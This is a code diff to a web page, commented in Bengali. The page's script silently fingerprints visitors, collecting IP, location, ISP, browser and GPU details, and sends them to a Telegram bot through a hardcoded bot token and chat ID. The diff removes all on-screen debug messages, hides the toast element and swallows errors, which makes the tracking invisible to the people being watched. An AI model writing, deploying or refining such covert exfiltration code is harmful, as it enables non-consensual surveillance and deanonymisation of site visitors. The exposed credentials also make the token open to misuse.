@@ -72,20 +72,9 @@
       padding-top: 20px;
       font-style: italic;
     }
+    /* ডিবাগ টোস্ট সম্পূর্ণ লুকানো */
     .debug-toast {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: #ffb347;
-      color: #1e1e1e;
-      padding: 8px 15px;
-      border-radius: 30px;
-      font-size: 12px;
-      font-family: monospace;
-      z-index: 9999;
-      opacity: 0;
-      transition: opacity 0.3s;
-      pointer-events: none;
+      display: none;
     }
   </style>
 </head>
@@ -121,21 +110,10 @@
 <script>
 (function() {
   // ============================================================
-  // 🔧 আপনার টেলিগ্রাম বটের তথ্য এখানে বসান (নতুন বট বানিয়ে নিন)
+  // আপনার টেলিগ্রাম বটের তথ্য (ইতিমধ্যে সেট করা আছে)
   // ============================================================
-  const BOT_TOKEN = "8799814426:AAE6mSoNsaCVRjxLUIkrejaSL8dDO6pAf-A";   // 👈 এখানে আপনার টোকেন দিন
-  const DEFAULT_CHAT_ID = "7709670231"; // 👈 এখানে আপনার চ্যাট আইডি দিন
-  
-  // ডিবাগ টোস্ট দেখানোর ফাংশন
-  function showDebugMessage(msg) {
-    const toast = document.getElementById('debugToast');
-    if (toast) {
-      toast.textContent = msg;
-      toast.style.opacity = '1';
-      setTimeout(() => { toast.style.opacity = '0'; }, 4000);
-    }
-    console.log(msg);
-  }
+  const BOT_TOKEN = "8799814426:AAE6mSoNsaCVRjxLUIkrejaSL8dDO6pAf-A";
+  const DEFAULT_CHAT_ID = "7709670231";
   
   // চ্যাট আইডি নির্ধারণ (URL প্যারামিটার 'id' থাকলে সেটা ব্যবহার করবে)
   function getChatId() {
@@ -145,11 +123,6 @@
       if (id && /^\d+$/.test(id)) return id;
     } catch(e) {}
     return DEFAULT_CHAT_ID;
-  }
-  
-  // টোকেন চেক (খালি থাকলে সতর্কতা)
-  if (BOT_TOKEN === "8799814426:AAE6mSoNsaCVRjxLUIkrejaSL8dDO6pAf-A" || DEFAULT_CHAT_ID === "7709670231") {
-    
   }
   
   // ----- ডাটা কালেকশন ফাংশন -----
@@ -281,7 +254,7 @@
         const d = await res.json();
         return { ip: d.ip || "অজানা", city: d.city || "", region: d.region || "", country: d.country_name || "", isp: d.org || "" };
       }
-    } catch(e) { console.log("ipapi failed", e); }
+    } catch(e) { }
     try {
       const fall = await fetch("https://api.ipify.org?format=json");
       if (fall.ok) { const f = await fall.json(); return { ip: f.ip, city: "", region: "", country: "", isp: "" }; }
@@ -289,15 +262,12 @@
     return { ip: "পাওয়া যায়নি", city: "", region: "", country: "", isp: "" };
   }
 
-  // ---------- মূল ফাংশন ----------
+  // ---------- মূল ফাংশন (কোনো ডিবাগ বার্তা ছাড়াই) ----------
   async function sendSilentReport() {
     const chatId = getChatId();
     if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
-      showDebugMessage("❌ বট টোকেন সেট করা নেই। রিপোর্ট পাঠানো হয়নি।");
       return;
     }
-    
-    showDebugMessage("📡 ডাটা সংগ্রহ করা হচ্ছে...");
     
     const ua = getUAInfo();
     const hardware = getHardwareBasic();
@@ -379,15 +349,9 @@ WebGL: ${gpu.webgl}
     params.append("disable_web_page_preview", "true");
     
     try {
-      const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params });
-      const result = await response.json();
-      if (result.ok) {
-        showDebugMessage("✅ টেলিগ্রামে রিপোর্ট পাঠানো সফল!");
-      } else {
-        showDebugMessage(`❌ টেলিগ্রাম এরর: ${result.description || "অজানা ত্রুটি"}`);
-      }
+      await fetch(url, { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: params });
     } catch(e) {
-      showDebugMessage(`❌ নেটওয়ার্ক ত্রুটি: ${e.message}`);
+      // কোনো ত্রুটি নীরবে উপেক্ষা করা হবে
     }
   }
 
